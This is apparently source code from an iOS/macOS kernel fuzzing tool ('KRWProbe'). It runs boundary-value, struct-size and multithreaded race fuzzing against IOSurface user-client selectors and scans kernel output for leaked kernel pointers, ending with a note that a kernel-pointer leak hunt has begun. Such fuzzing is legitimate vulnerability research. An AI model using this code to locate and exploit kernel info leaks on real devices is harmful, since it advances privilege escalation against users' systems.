static int hard_conn_tick(HardConn *hc, const char *phase) {
    if (hc->calls > 0 && (hc->calls % 256) == 0) {
        hard_conn_close(hc);
        if (!hard_conn_reopen(hc, phase)) return 0;
    }
    return 1;
}

// The only release path for sel-0 surfaces is closing the owning user client
// (sel 1 is a different table and returns 0xe00002c2 for sel-0 ids).  Recycle
// as soon as this connection is holding too much, so a successful large
// surface can never be followed by a second one.
static int hard_conn_account(HardConn *hc, uint64_t allocBytes, const char *phase) {
    hc->liveBytes += allocBytes;
    if (hc->liveBytes > HARD_LIVE_CAP) {
        L(@"HARD: recycling conn in %s gen=%d live=%llu bytes",
          phase, hc->gen, (unsigned long long)hc->liveBytes);
        hard_conn_close(hc);
        if (!hard_conn_reopen(hc, phase)) return 0;
    }
    return 1;
}


// capacity-aware sel 0.  `info` must hold `cap` bytes; the structOut cap passed
// to the kernel is min(cap, IOSURFACE_INFO_SIZE), and the id is only read when
// the kernel actually returned enough bytes.
static kern_return_t hard_sel0_buf(io_connect_t conn, NSString *xml,
                                   uint8_t *info, size_t cap,
                                   uint32_t *sidOut, size_t *outSize) {
    if (sidOut) *sidOut = 0;
    if (outSize) *outSize = 0;
    if (!info || cap < 4) return 0xe00002c2;      // kIOReturnBadArgument
    memset(info, 0, cap);
    const char *xc = xml.UTF8String;
    if (!xc) return 0xe00002c2;
    size_t xlen = strlen(xc) + 1;                 // kernel requires trailing NUL
    if (xlen > HARD_XML_CAP) return 0xe00002c2;   // never exceed in-band limit
    size_t isz = cap < IOSURFACE_INFO_SIZE ? cap : IOSURFACE_INFO_SIZE;
    uint64_t sc[1] = { 0 };
    kern_return_t kr = IOConnectCallMethod(conn, 0, sc, 1, xc, xlen,
                                           NULL, NULL, info, &isz);
    if (outSize) *outSize = isz;
    if (sidOut && kr == KERN_SUCCESS && isz >= IOSURFACE_INFO_ID_OFF + 4) {
        *sidOut = rd32(info + IOSURFACE_INFO_ID_OFF);
    }
    return kr;
}

static kern_return_t hard_sel0(io_connect_t conn, NSString *xml,
                               uint32_t *sidOut, size_t *outSize) {
    uint8_t *info = (uint8_t *)calloc(1, IOSURFACE_INFO_SIZE);
    if (!info) return 0xe00002c2;
    kern_return_t kr = hard_sel0_buf(conn, xml, info, IOSURFACE_INFO_SIZE, sidOut, outSize);
    free(info);
    return kr;
}

static int hard_scan_ptrs(const uint8_t *p, size_t n,
                          uint64_t *firstVal, size_t *firstOff) {
    int hits = 0;
    if (!p) return 0;
    for (size_t i = 0; i + 8 <= n; i += 8) {
        uint64_t v;
        memcpy(&v, p + i, 8);
        if (v >= 0xffff000000000000ULL && v != 0xffffffffffffffffULL) {
            if (hits == 0) {
                if (firstVal) *firstVal = v;
                if (firstOff) *firstOff = i;
            }
            hits++;
        }
    }
    return hits;
}

static kern_return_t hard_geom_one(HardConn *hc,
                                   uint8_t *info, size_t infoCap,
                                   const int *chosen, const uint64_t *vals,
                                   const char *phase, int idx, int total,
                                   const char *desc, long *created,
                                   BOOL *connLost) {
  @autoreleasepool {                       // ~9k calls; keep the pool small
    // 1.5: never ask the kernel for an unbounded IOSurfaceAllocSize.  The
    // boundary sweep contains 0x40000000/0x80000000/0xffffffff; the first one
    // is a real 1 GiB allocation and the second one kills this process.
    uint64_t safeVals[MUT_FIELD_COUNT];
    memcpy(safeVals, vals, sizeof(safeVals));
    char descBuf[224];
    snprintf(descBuf, sizeof(descBuf), "%s", desc ? desc : "");
    if (chosen && chosen[MUT_ALLOC] && safeVals[MUT_ALLOC] > gHardAllocCap) {
        L(@"HARD: alloc clamp %s %d/%d %s: %llu -> %llu",
          phase, idx, total, descBuf, (unsigned long long)safeVals[MUT_ALLOC],
          (unsigned long long)gHardAllocCap);
        safeVals[MUT_ALLOC] = gHardAllocCap;
        size_t used = strlen(descBuf);
        snprintf(descBuf + used, sizeof(descBuf) - used, ",alloc_clamped=%llu",
                 (unsigned long long)gHardAllocCap);
    }
    uint64_t allocBytes = 0x4000;        // baseline image is 64x64x4
    if (chosen && chosen[MUT_ALLOC]) allocBytes = safeVals[MUT_ALLOC];
    NSString *xml = mutate_config_xml(chosen, safeVals);
    const char *xc = xml.UTF8String;
    size_t xlen = xc ? strlen(xc) + 1 : 0;
    if ((idx % 100) == 0) set_phase(@"HARD/geom %s %d/%d", phase, idx, total);
    hard_dump_config(xml, [NSString stringWithFormat:
        @"HARD geometry %s %d/%d %s", phase, idx, total, descBuf]);
    hard_write_action_ex([NSString stringWithFormat:
        @"{\"mode\":\"geom\",\"phase\":\"%s\",\"index\":%d,\"total\":%d,"
         "\"selector\":0,\"scalarIn\":[0],\"structInBytes\":%zu,"
         "\"structOutBytes\":%u,\"fields\":\"%s\",\"gen\":%d,"
         "\"liveBytes\":%llu,\"config\":\"last_config.xml\"}",
        phase, idx, total, xlen, IOSURFACE_INFO_SIZE, descBuf, hc->gen,
        (unsigned long long)hc->liveBytes], YES);
    uint32_t sid = 0;
    size_t osz = 0;
    kern_return_t kr = hard_sel0_buf(hc->conn, xml, info, infoCap, &sid, &osz);
    if (kr == KERN_SUCCESS) {
        (*created)++;
        if (!hard_conn_account(hc, allocBytes, phase)) *connLost = YES;
    }
    if ((idx % 100) == 0 || idx == total - 1 || kr == KERN_SUCCESS) {
        L(@"HARD geom %s %d/%d created=%ld kr=0x%x id=%u out=%zu gen=%d [%s]",
          phase, idx, total, *created, kr, sid, osz, hc->gen, descBuf);
    }
    return kr;
  }
}

static void hard_geometry(void) {
    int totalSingles = kHardCTCount + (MUT_FIELD_COUNT - 1) * kBoundaryCount;
    int totalCTPairs = (MUT_FIELD_COUNT - 1) * kHardCTCount * kBoundaryCount;
    int totalPairs = kHardPairCount * kBoundaryCount * kBoundaryCount;
    int totalAll = totalSingles + totalCTPairs + totalPairs;
    int stage = hard_stage_ordinal(gHardCfgStage);   // 0 singles, 1 ct-pair, 2 pair

    L(@"[HARD] geometry start: %d singles + %d CT-pairs + %d selected pairs = %d sel0 calls",
      totalSingles, totalCTPairs, totalPairs, totalAll);
    L(@"[HARD] resume: phase=%d stage=%@(%d) index=%d (inclusive) alloc_cap=%llu src=%@",
      gHardCfgPhase, gHardCfgStage, stage, gHardCfgIndex,
      (unsigned long long)gHardAllocCap, gHardCfgSource);
    if (gHardAllocCap > HARD_DEFAULT_ALLOC_CAP)
        L(@"HARD: warning alloc_cap %llu > default %llu; big allocations can still kill the app",
          (unsigned long long)gHardAllocCap,
          (unsigned long long)HARD_DEFAULT_ALLOC_CAP);

    HardConn hc = { 0, 0, 0, 0 };
    hc.conn = hard_open_conn();
    if (!hc.conn) return;

    // Reused for all ~9k calls; never larger than IOSurfaceInfo.
    uint8_t *info = (uint8_t *)calloc(1, HARD_OUT_CAP);
    if (!info) { L(@"HARD: geometry buffer alloc failed"); IOServiceClose(hc.conn); return; }

    long created = 0;
    int idx = 0;
    BOOL failed = NO;
    BOOL connLost = NO;

    // 1) one field at a time, valid CT=4 baseline for everything except CT
    if (stage > 0) {
        L(@"HARD: skip group singles (resume at stage=%@)", gHardCfgStage);
    } else {
        set_phase(@"HARD/geom singles start (%d)", totalSingles);
        L(@"[HARD] group singles start idx=%d/%d (first=%d)",
          MIN(gHardCfgIndex, totalSingles), totalSingles, gHardCfgIndex);
        hard_write_progress(@"singles", gHardCfgIndex, totalSingles);
        for (int f = 0; f < MUT_FIELD_COUNT && !gStop && !failed; f++) {
            const uint64_t *set = (f == MUT_CT) ? kHardCTValues : kBoundaryValues;
            int n = (f == MUT_CT) ? kHardCTCount : kBoundaryCount;
            for (int vi = 0; vi < n && !gStop; vi++) {
                int thisIdx = idx++;
                if (stage == 0 && thisIdx < gHardCfgIndex) continue;
                hc.calls++;
                if (!hard_conn_tick(&hc, "geometry/single")) { failed = YES; break; }
                int chosen[MUT_FIELD_COUNT] = {0};
                uint64_t vals[MUT_FIELD_COUNT] = {0};
                chosen[f] = 1;
                vals[f] = set[vi];
                if (f != MUT_CT) { chosen[MUT_CT] = 1; vals[MUT_CT] = 4; }
                char desc[192];
                if (f == MUT_CT)
                    snprintf(desc, sizeof(desc), "CT=%llu", (unsigned long long)vals[f]);
                else
                    snprintf(desc, sizeof(desc), "CT=4,%s=%llu",
                             kMutKeys[f], (unsigned long long)vals[f]);
                hard_geom_one(&hc, info, HARD_OUT_CAP, chosen, vals,
                              "single", thisIdx, totalSingles, desc, &created, &connLost);
                if (connLost) { failed = YES; break; }
            }
        }
    }

    // 2) compression type x every other field
    idx = 0;
    if (stage > 1) {
        L(@"HARD: skip group ct-pair (resume at stage=%@)", gHardCfgStage);
    } else {
        set_phase(@"HARD/geom ct-pairs start (%d)", totalCTPairs);
        L(@"[HARD] group ct-pair start idx=%d/%d (first=%d)",
          (stage == 1) ? MIN(gHardCfgIndex, totalCTPairs) : 0, totalCTPairs, gHardCfgIndex);
        hard_write_progress(@"ct-pair", (stage == 1) ? gHardCfgIndex : 0, totalCTPairs);
        for (int f = 0; f < MUT_FIELD_COUNT && !gStop && !failed; f++) {
            if (f == MUT_CT) continue;
            for (int ci = 0; ci < kHardCTCount && !gStop && !failed; ci++) {
                for (int vi = 0; vi < kBoundaryCount && !gStop && !failed; vi++) {
                    int thisIdx = idx++;
                    if (stage == 1 && thisIdx < gHardCfgIndex) continue;
                    hc.calls++;
                    if (!hard_conn_tick(&hc, "geometry/ct-pair")) { failed = YES; break; }
                    int chosen[MUT_FIELD_COUNT] = {0};
                    uint64_t vals[MUT_FIELD_COUNT] = {0};
                    chosen[MUT_CT] = 1; vals[MUT_CT] = kHardCTValues[ci];
                    chosen[f] = 1;      vals[f] = kBoundaryValues[vi];
                    char desc[192];
                    snprintf(desc, sizeof(desc), "CT=%llu,%s=%llu",
                             (unsigned long long)vals[MUT_CT], kMutKeys[f],
                             (unsigned long long)vals[f]);
                    hard_geom_one(&hc, info, HARD_OUT_CAP, chosen, vals,
                                  "ct-pair", thisIdx, totalCTPairs, desc, &created, &connLost);
                    if (connLost) { failed = YES; break; }
                }
            }
        }
    }

    // 3) selected numeric pairs, fixed valid CT=4
    idx = 0;
    if (stage > 2) {
        L(@"HARD: skip group pair");
    } else {
        set_phase(@"HARD/geom pairs start (%d)", totalPairs);
        L(@"[HARD] group pair start idx=%d/%d (first=%d)",
          (stage == 2) ? MIN(gHardCfgIndex, totalPairs) : 0, totalPairs, gHardCfgIndex);
        hard_write_progress(@"pair", (stage == 2) ? gHardCfgIndex : 0, totalPairs);
        for (int p = 0; p < kHardPairCount && !gStop && !failed; p++) {
            int a = kHardPairs[p].a, b = kHardPairs[p].b;
            for (int ai = 0; ai < kBoundaryCount && !gStop && !failed; ai++) {
                for (int bi = 0; bi < kBoundaryCount && !gStop && !failed; bi++) {
                    int thisIdx = idx++;
                    if (stage == 2 && thisIdx < gHardCfgIndex) continue;
                    hc.calls++;
                    if (!hard_conn_tick(&hc, "geometry/pair")) { failed = YES; break; }
                    int chosen[MUT_FIELD_COUNT] = {0};
                    uint64_t vals[MUT_FIELD_COUNT] = {0};
                    chosen[MUT_CT] = 1; vals[MUT_CT] = 4;
                    chosen[a] = 1;      vals[a] = kBoundaryValues[ai];
                    chosen[b] = 1;      vals[b] = kBoundaryValues[bi];
                    char desc[192];
                    snprintf(desc, sizeof(desc), "CT=4,%s=%llu,%s=%llu",
                             kMutKeys[a], (unsigned long long)vals[a],
                             kMutKeys[b], (unsigned long long)vals[b]);
                    hard_geom_one(&hc, info, HARD_OUT_CAP, chosen, vals,
                                  "pair", thisIdx, totalPairs, desc, &created, &connLost);
                    if (connLost) { failed = YES; break; }
                }
            }
        }
    }

    free(info);
    if (hc.conn) IOServiceClose(hc.conn);
    set_phase(@"HARD/geom done");
    L(@"[HARD] geometry summary: calls=%ld created=%ld (%.2f%%), reconnects=%d%s",
      hc.calls, created, hc.calls ? 100.0 * (double)created / (double)hc.calls : 0.0,
      hc.gen, (failed || connLost) ? " RECONNECT-FAIL" : "");
}

#define HARD_SIZE_COUNT  (6 + (0x200 - 0xd + 1))   // 0,1,4,8,0xb,0xc + 0xd..0x200

static void hard_struct_shapes(void) {
    io_connect_t conn = hard_open_conn();
    if (!conn) return;

    set_phase(@"HARD/struct setup (sel0)");
    uint32_t sid = 0;
    NSString *xml = create_surface_xml();
    const char *xc = xml.UTF8String;
    size_t xlen = xc ? strlen(xc) + 1 : 0;
    hard_write_action_ex([NSString stringWithFormat:
        @"{\"mode\":\"struct-setup\",\"selector\":0,\"scalarIn\":[0],"
         "\"structInBytes\":%zu,\"structOutBytes\":%u,\"config\":\"plain-64x64-bgra\"}",
        xlen, IOSURFACE_INFO_SIZE], YES);
    kern_return_t ckr = hard_sel0(conn, xml, &sid, NULL);
    L(@"[HARD] struct target: sel0 kr=0x%x id=%u", ckr, sid);
    if (ckr != KERN_SUCCESS) { IOServiceClose(conn); return; }

    static const int sels[] = { 2, 3, 9, 10, 11 };
    static const size_t outCaps[] = { IOSURFACE_INFO_SIZE, 4, 4, 0x800, 4 };
    const int nsel = 5;

    size_t sizes[HARD_SIZE_COUNT];
    int ns = 0;
    sizes[ns++] = 0;
    sizes[ns++] = 1;
    sizes[ns++] = 4;
    sizes[ns++] = 8;
    sizes[ns++] = 0xb;
    sizes[ns++] = 0xc;
    for (size_t z = 0xd; z <= 0x200; z++) {
        if (ns >= HARD_SIZE_COUNT) break;          // belt and braces
        sizes[ns++] = z;
    }

    // Two heap buffers for all 12,650 calls: `in` is 0x200, `out` is 0x1000
    // (IOSurfaceInfo is 0xc68).  Both caps are enforced below.
    uint8_t *in = (uint8_t *)calloc(1, HARD_IN_CAP);
    uint8_t *out = (uint8_t *)calloc(1, HARD_OUT_CAP);
    if (!in || !out) {
        L(@"[HARD] struct: buffer alloc failed");
        free(in); free(out);
        IOServiceClose(conn);
        return;
    }

    long totalCalls = 0;
    long reachedAll = 0, okAll = 0, ptrHitsAll = 0;
    long reached[5] = {0}, ok[5] = {0}, ptrHits[5] = {0};
    long suppressed = 0;

    L(@"[HARD] struct-shape start: 5 selectors x %d sizes x 5 scalar counts = %d calls",
      ns, nsel * ns * 5);

    for (int si = 0; si < nsel && !gStop; si++) {
        int sel = sels[si];
        size_t outCap = outCaps[si];
        if (outCap > HARD_OUT_CAP) outCap = HARD_OUT_CAP;
        long logged = 0;                 // detail-line budget for this selector
        long ptrLogged = 0;
        set_phase(@"HARD/struct sel %d (%zu sizes)", sel, (size_t)ns);

        for (int zi = 0; zi < ns && !gStop; zi++) {
            size_t inSize = sizes[zi];
            if (inSize > HARD_IN_CAP) inSize = HARD_IN_CAP;
            if ((zi % 25) == 0) {
                set_phase(@"HARD/struct sel %d size %zu/%d (0x%zx)",
                          sel, (size_t)zi, ns, inSize);
            }
            for (int nsc = 0; nsc <= 4 && !gStop; nsc++) {
                @autoreleasepool {
                    memset(in, 0, HARD_IN_CAP);
                    if (inSize >= 4) memcpy(in, &sid, 4);
                    if (sel == 9) {
                        NSString *pl = set_value_xml();
                        const char *pc = pl.UTF8String;
                        size_t plen = pc ? strlen(pc) + 1 : 0;
                        if (inSize > 0xc && plen) {
                            size_t room = inSize - 0xc;
                            if (room > HARD_IN_CAP - 0xc) room = HARD_IN_CAP - 0xc;
                            size_t n = MIN(plen, room);
                            memcpy(in + 0xc, pc, n);
                        }
                    } else if (sel == 10 || sel == 11) {
                        const char *key = "HARDKey";
                        size_t klen = strlen(key) + 1;
                        if (inSize > 0xc) {
                            size_t room = inSize - 0xc;
                            if (room > HARD_IN_CAP - 0xc) room = HARD_IN_CAP - 0xc;
                            size_t n = MIN(klen, room);
                            memcpy(in + 0xc, key, n);
                        }
                    }

                    uint64_t sc[4] = { sid, 0, 0, 0 };
                    hard_write_action_ex([NSString stringWithFormat:
                        @"{\"mode\":\"struct\",\"selector\":%d,\"scalarCount\":%d,"
                         "\"scalarIn\":[%llu,%llu,%llu,%llu],\"structInBytes\":%zu,"
                         "\"structOutBytes\":%zu,\"inHex\":\"%@\",\"trailingFill\":\"00\"}",
                        sel, nsc,
                        (unsigned long long)(nsc > 0 ? sc[0] : 0),
                        (unsigned long long)(nsc > 1 ? sc[1] : 0),
                        (unsigned long long)(nsc > 2 ? sc[2] : 0),
                        (unsigned long long)(nsc > 3 ? sc[3] : 0),
                        inSize, outCap,
                        hard_hex(in, inSize)], YES);

                    memset(out, 0, HARD_OUT_CAP);
                    size_t osz = outCap;
                    kern_return_t kr = IOConnectCallMethod(
                        conn, (uint32_t)sel,
                        nsc ? sc : NULL, (uint32_t)nsc,
                        inSize ? in : NULL, inSize,
                        NULL, NULL, out, &osz);
                    totalCalls++;
                    if (osz > outCap) osz = outCap;     // defensive

                    if (kr != 0xe00002c2) {
                        reachedAll++;
                        reached[si]++;
                        if (kr == KERN_SUCCESS) { okAll++; ok[si]++; }

                        uint64_t pv = 0;
                        size_t off = 0;
                        int ph = hard_scan_ptrs(out, MIN(osz, HARD_OUT_CAP), &pv, &off);
                        if (ph) {
                            ptrHitsAll += ph;
                            ptrHits[si] += ph;
                        }
                        // 12k detail lines used to flood the main queue and the
                        // text view; keep the first 300 per selector plus a
                        // bounded number of pointer hits, count the rest.
                        if (logged < 300 || (ph && ptrLogged < 400)) {
                            logged++;
                            if (ph) ptrLogged++;
                            L(@"HARD struct sel=%d in=%zu nsc=%d -> kr=0x%x out=%zu%s",
                              sel, inSize, nsc, kr, osz, ph ? " PTR" : "");
                            if (ph) {
                                L(@"  KERNEL-LIKE ptr at out+0x%zx = 0x%016llx (%d hit(s))\n%@",
                                  off, (unsigned long long)pv, ph,
                                  hexdump_lines(out, MIN(osz, (size_t)0x80)));
                            }
                        } else {
                            suppressed++;
                        }
                    }
                }
            }
        }
        set_phase(@"HARD/struct sel %d done", sel);
        L(@"[HARD] struct sel=%d: sizes=%d reached=%ld ok=%ld ptr_hits=%ld",
          sel, ns, reached[si], ok[si], ptrHits[si]);
    }

    free(in);
    free(out);
    IOServiceClose(conn);
    set_phase(@"HARD/struct done");
    L(@"[HARD] struct summary: calls=%ld reached(non-badsize)=%ld ok=%ld "
      "kernel_like_ptr_hits=%ld suppressed_detail_lines=%ld",
      totalCalls, reachedAll, okAll, ptrHitsAll, suppressed);
}

typedef struct {
    volatile int stop;
    volatile long setOps, getOps, remOps, use2Ops, use3Ops;
    volatile long churnOps, churnFail;
    volatile long err9, err10, err11, err2, err3;
    volatile long ptrHits;
    volatile uint64_t firstPtr;
    volatile int firstPtrSel;
} HardRaceStats;

static void hard_race_action(const char *thread, int sel, int nsc,
                             const uint64_t *sc, size_t inSize, size_t outSize,
                             NSString *extra) {
    hard_write_action([NSString stringWithFormat:
        @"{\"mode\":\"race\",\"thread\":\"%s\",\"selector\":%d,\"scalarCount\":%d,"
         "\"scalarIn\":[%llu,%llu,%llu,%llu],\"structInBytes\":%zu,"
         "\"structOutBytes\":%zu%@}",
        thread, sel, nsc,
        (unsigned long long)(nsc > 0 ? sc[0] : 0),
        (unsigned long long)(nsc > 1 ? sc[1] : 0),
        (unsigned long long)(nsc > 2 ? sc[2] : 0),
        (unsigned long long)(nsc > 3 ? sc[3] : 0),
        inSize, outSize, extra ? extra : @""]);
}

static void hard_race_record_ptrs(HardRaceStats *st, const uint8_t *out, size_t n,
                                  int sel) {
    uint64_t pv = 0;
    size_t off = 0;
    int ph = hard_scan_ptrs(out, n, &pv, &off);
    if (!ph) return;
    __sync_fetch_and_add(&st->ptrHits, ph);
    uint64_t old = __sync_val_compare_and_swap(&st->firstPtr, 0, pv);
    if (old == 0) st->firstPtrSel = sel;
}

static void hard_race_set(io_connect_t conn, uint32_t sid, HardRaceStats *st) {
    unsigned long n = 0;
    while (!st->stop && !gStop) {
        @autoreleasepool {
            uint64_t val = (n & 1) ? 0xffffffffULL : (uint64_t)(n % 5);
            char pl[192];
            int plen = snprintf(pl, sizeof(pl),
                "<plist version=\"1.0\"><array><integer>%llu</integer>"
                "<string>HARDKey</string></array></plist>",
                (unsigned long long)val);
            if (plen < 0) plen = 0;
            if ((size_t)plen >= sizeof(pl)) plen = (int)sizeof(pl) - 1;   // clamp truncation
            size_t inSize = 0xc + (size_t)plen + 1;
            uint8_t in[256];
            memset(in, 0, sizeof(in));
            if (inSize > sizeof(in)) inSize = sizeof(in);
            memcpy(in, &sid, 4);
            memcpy(in + 0xc, pl, (size_t)plen + 1);

            hard_race_action("set", 9, 0, NULL, inSize, 4,
                [NSString stringWithFormat:@",\"key\":\"HARDKey\",\"value\":%llu",
                 (unsigned long long)val]);
            uint32_t out = 0;
            size_t osz = sizeof(out);
            kern_return_t kr = IOConnectCallMethod(conn, 9, NULL, 0,
                                                   in, inSize, NULL, NULL, &out, &osz);
            if (kr != KERN_SUCCESS) __sync_fetch_and_add(&st->err9, 1);
            __sync_fetch_and_add(&st->setOps, 1);
            n++;
        }
    }
}

static void hard_race_get(io_connect_t conn, uint32_t sid, HardRaceStats *st) {
    uint8_t *out = (uint8_t *)calloc(1, HARD_OUT_CAP);
    if (!out) { __sync_fetch_and_add(&st->err10, 1); return; }
    while (!st->stop && !gStop) {
        @autoreleasepool {
            const char *key = "HARDKey";
            size_t klen = strlen(key) + 1;
            size_t inSize = 0xc + klen;
            uint8_t in[32];
            memset(in, 0, sizeof(in));
            memcpy(in, &sid, 4);
            memcpy(in + 0xc, key, klen);

            hard_race_action("get", 10, 0, NULL, inSize, 0x800,
                             @",\"key\":\"HARDKey\"");
            memset(out, 0, HARD_OUT_CAP);
            size_t osz = 0x800;                 // sel 10 answer, < HARD_OUT_CAP
            kern_return_t kr = IOConnectCallMethod(conn, 10, NULL, 0,
                                                   in, inSize, NULL, NULL, out, &osz);
            if (kr != KERN_SUCCESS) __sync_fetch_and_add(&st->err10, 1);
            if (osz > HARD_OUT_CAP) osz = HARD_OUT_CAP;
            hard_race_record_ptrs(st, out, MIN(osz, HARD_OUT_CAP), 10);
            __sync_fetch_and_add(&st->getOps, 1);
        }
    }
    free(out);
}

static void hard_race_remove(io_connect_t conn, uint32_t sid, HardRaceStats *st) {
    while (!st->stop && !gStop) {
        @autoreleasepool {
            const char *key = "HARDKey";
            size_t klen = strlen(key) + 1;
            size_t inSize = 0xc + klen;
            uint8_t in[32];
            memset(in, 0, sizeof(in));
            memcpy(in, &sid, 4);
            memcpy(in + 0xc, key, klen);

            hard_race_action("remove", 11, 0, NULL, inSize, 4,
                             @",\"key\":\"HARDKey\"");
            uint32_t out = 0;
            size_t osz = sizeof(out);
            kern_return_t kr = IOConnectCallMethod(conn, 11, NULL, 0,
                                                   in, inSize, NULL, NULL, &out, &osz);
            if (kr != KERN_SUCCESS) __sync_fetch_and_add(&st->err11, 1);
            __sync_fetch_and_add(&st->remOps, 1);
        }
    }
}

static void hard_race_use2(io_connect_t conn, uint32_t sid, HardRaceStats *st) {
    unsigned long n = 0;
    uint8_t *out = (uint8_t *)calloc(1, HARD_OUT_CAP);
    if (!out) { __sync_fetch_and_add(&st->err2, 1); return; }
    while (!st->stop && !gStop) {
        @autoreleasepool {
            uint32_t flags = (uint32_t)(n & 7);
            uint8_t in[0xc];
            memset(in, 0, sizeof(in));
            memcpy(in, &sid, 4);
            memcpy(in + 4, &flags, 4);

            hard_race_action("use2", 2, 0, NULL, sizeof(in), IOSURFACE_INFO_SIZE,
                [NSString stringWithFormat:@",\"surfaceID\":%u,\"flags\":%u",
                 sid, flags]);
            memset(out, 0, HARD_OUT_CAP);
            size_t osz = IOSURFACE_INFO_SIZE;   // 0xc68, < HARD_OUT_CAP
            kern_return_t kr = IOConnectCallMethod(conn, 2, NULL, 0,
                                                   in, sizeof(in), NULL, NULL, out, &osz);
            if (kr != KERN_SUCCESS) __sync_fetch_and_add(&st->err2, 1);
            if (osz > HARD_OUT_CAP) osz = HARD_OUT_CAP;
            hard_race_record_ptrs(st, out, MIN(osz, HARD_OUT_CAP), 2);
            __sync_fetch_and_add(&st->use2Ops, 1);
            n++;
        }
    }
    free(out);
}

static void hard_race_use3(io_connect_t conn, uint32_t sid, HardRaceStats *st) {
    unsigned long n = 0;
    while (!st->stop && !gStop) {
        @autoreleasepool {
            uint32_t arg = (uint32_t)(n & 1);
            uint8_t in[0xc];
            memset(in, 0, sizeof(in));
            memcpy(in, &sid, 4);
            memcpy(in + 4, &arg, 4);

            hard_race_action("use3", 3, 0, NULL, sizeof(in), 4,
                [NSString stringWithFormat:@",\"surfaceID\":%u,\"arg\":%u", sid, arg]);
            uint32_t out = 0;
            size_t osz = sizeof(out);
            kern_return_t kr = IOConnectCallMethod(conn, 3, NULL, 0,
                                                   in, sizeof(in), NULL, NULL, &out, &osz);
            if (kr != KERN_SUCCESS) __sync_fetch_and_add(&st->err3, 1);
            __sync_fetch_and_add(&st->use3Ops, 1);
            n++;
        }
    }
}

static void hard_race_churn(HardRaceStats *st) {
    while (!st->stop && !gStop) {
        @autoreleasepool {
            hard_write_action(@"{"
                "\"mode\":\"race\",\"thread\":\"churn\",\"api\":\"IOSurfaceCreate\","
                "\"width\":64,\"height\":64,\"bytesPerElement\":4,"
                "\"pixelFormat\":1111970369}");
            IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)base_props(64, 64));
            if (s) {
                CFRelease(s);
                __sync_fetch_and_add(&st->churnOps, 1);
            } else {
                __sync_fetch_and_add(&st->churnFail, 1);
            }
            usleep(1000);
        }
    }
}

static void hard_race(int seconds) {
    io_connect_t conn = hard_open_conn();
    if (!conn) return;

    set_phase(@"HARD/race setup (sel0)");
    uint32_t sid = 0;
    NSString *xml = create_surface_xml();
    const char *xc = xml.UTF8String;
    size_t xlen = xc ? strlen(xc) + 1 : 0;
    hard_write_action_ex([NSString stringWithFormat:
        @"{\"mode\":\"race\",\"thread\":\"setup\",\"selector\":0,"
         "\"scalarIn\":[0],\"structInBytes\":%zu,\"structOutBytes\":%u,"
         "\"config\":\"plain-64x64-bgra\"}", xlen, IOSURFACE_INFO_SIZE], YES);
    kern_return_t ckr = hard_sel0(conn, xml, &sid, NULL);
    L(@"[HARD] race target: sel0 kr=0x%x id=%u", ckr, sid);
    if (ckr != KERN_SUCCESS) { IOServiceClose(conn); return; }

    // Heap-allocated: on a timeout the threads may still touch the counters,
    // so the block must outlive this stack frame.
    HardRaceStats *stp = (HardRaceStats *)calloc(1, sizeof(HardRaceStats));
    if (!stp) { L(@"[HARD] race: stats alloc failed"); IOServiceClose(conn); return; }
    dispatch_group_t g = dispatch_group_create();
    dispatch_queue_t q = dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0);

    L(@"[HARD] race start: %ds, threads=6 (sel9, sel10, sel11, sel2, sel3, churn)", seconds);
    set_phase(@"HARD/race %ds", seconds);
    dispatch_group_async(g, q, ^{ hard_race_set(conn, sid, stp); });
    dispatch_group_async(g, q, ^{ hard_race_get(conn, sid, stp); });
    dispatch_group_async(g, q, ^{ hard_race_remove(conn, sid, stp); });
    dispatch_group_async(g, q, ^{ hard_race_use2(conn, sid, stp); });
    dispatch_group_async(g, q, ^{ hard_race_use3(conn, sid, stp); });
    dispatch_group_async(g, q, ^{ hard_race_churn(stp); });

    for (int t = 0; t < seconds * 10 && !gStop; t++) usleep(100000);
    stp->stop = 1;
    // Bounded wait: if an IO call is wedged, do not close `conn` and do not
    // free the stats (the worker threads might still be inside a syscall).
    long waited = dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW,
                                                        (int64_t)60 * NSEC_PER_SEC));
    if (waited != 0) {
        L(@"[HARD] race: threads still running 60s after stop; connection/stats left alive");
        return;
    }
    IOServiceClose(conn);
    set_phase(@"HARD/race done");

    L(@"[HARD] race summary: set=%ld get=%ld remove=%ld use2=%ld use3=%ld "
      "churn=%ld churn_fail=%ld",
      stp->setOps, stp->getOps, stp->remOps, stp->use2Ops, stp->use3Ops,
      stp->churnOps, stp->churnFail);
    L(@"[HARD] race errors: sel9=%ld sel10=%ld sel11=%ld sel2=%ld sel3=%ld; "
      "kernel_like_ptr_hits=%ld first_ptr=0x%016llx (sel=%d)",
      stp->err9, stp->err10, stp->err11, stp->err2, stp->err3,
      stp->ptrHits, (unsigned long long)stp->firstPtr, stp->firstPtrSel);
    free(stp);
}

static void hard_loop(void) {
    if (gHardBusy) { L(@"HARD: already running"); return; }
    gHardBusy = 1;
    gStop = 0;
    gState = 0x9e3779b97f4a7c15ULL ^ (uint64_t)mach_absolute_time();

    hard_load_config();                 // 1.5: resume point, alloc cap
    set_phase(@"HARD: start");
    L(@"=== KRWProbe %@ HARD ===", app_version());
    L(@"[HARD] plan: phase=%d (0=geom 1=struct 2=race) stage=%@ index=%d alloc_cap=%llu",
      gHardCfgPhase, gHardCfgStage, gHardCfgIndex, (unsigned long long)gHardAllocCap);
    L(@"[HARD] resume file: %@", gHardCfgPath ?: @"(unavailable)");
    L(@"[HARD] progress file: %@", gHardProgressPath ?: @"(unavailable)");

    if (!gStop && gHardCfgPhase <= 0) {
        hard_geometry();
    } else if (gHardCfgPhase > 0) {
        L(@"[HARD] skip phase 0 (geometry) - resume phase=%d", gHardCfgPhase);
    }
    if (!gStop && gHardCfgPhase <= 1) {
        set_phase(@"HARD/struct start");
        L(@"[HARD] group struct-shapes start (sel 2/3/9/10/11)");
        hard_write_progress(@"struct", 0, HARD_SIZE_COUNT);
        hard_struct_shapes();
    } else if (gHardCfgPhase > 1) {
        L(@"[HARD] skip phase 1 (struct) - resume phase=%d", gHardCfgPhase);
    }
    if (!gStop && gHardCfgPhase <= 2) {
        set_phase(@"HARD/race start");
        L(@"[HARD] group race start (30s)");
        hard_write_progress(@"race", 0, 30);
        hard_race(30);
    }
    set_phase(@"HARD: done");
    L(@"--- HARD done ---");
    gHardBusy = 0;
}


// ---- LEAK: targeted sel 10 kernel-pointer hunt (1.6) ----
//
// 1.5 HARD race summary:
//   kernel_like_ptr_hits=255047 first_ptr=0xffffffff84000040 (sel=10)
